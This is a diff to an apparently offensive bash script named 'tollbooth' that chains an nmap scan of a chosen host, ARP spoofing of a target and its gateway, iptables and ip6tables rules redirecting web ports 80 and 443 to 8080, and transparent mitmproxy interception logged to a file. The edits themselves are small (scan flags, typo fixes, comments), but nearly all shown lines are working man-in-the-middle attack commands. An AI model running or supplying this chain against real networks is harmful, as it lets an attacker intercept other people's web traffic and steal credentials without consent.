@@ -26,14 +26,14 @@ echo
 
 read IP_address
 
-nmap -sS -O $IP_address
+nmap -A $IP_address
 
 echo
 echo =========================================================================================
 
 # Select Target IP address and Gateway address to start ARP spoofing
 echo
-echo "To being ARP Spoofing, please provide the TARGET IP and GATEWAY IP addresses"
+echo "To begin ARP Spoofing, please provide the TARGET IP and GATEWAY IP addresses"
 echo
 
 read -p "TARGET IP: " Target
@@ -46,7 +46,7 @@ echo
 read -p  "Would you like to begin ARP Spoofing with the provdied IP address? (Y/N): " Y
 
 gnome-terminal -- ./arpspoof.sh
-# a sepearte executeable file that contains an executes the command- arpspoof -i eth0 -t (Target IP) (Gateway IP) 
+# arpspoof.sh is a sepearte executeable file with the command: arpspoof -i eth0 -t (Target IP) (Gateway IP) 
 
 echo 
 echo =========================================================================================
@@ -70,6 +70,9 @@ iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8
 ip6tables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
 
 ip6tables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
+
+# Firewall rules must first be set in order for the attacking machine to allow for traffic to flow uninterupted
+# These same rules can be configured within the linux system to be set permenantely.
 
 mitmproxy --mode transparent --showhost >> /root/tollbooth/mitmproxy_log
 
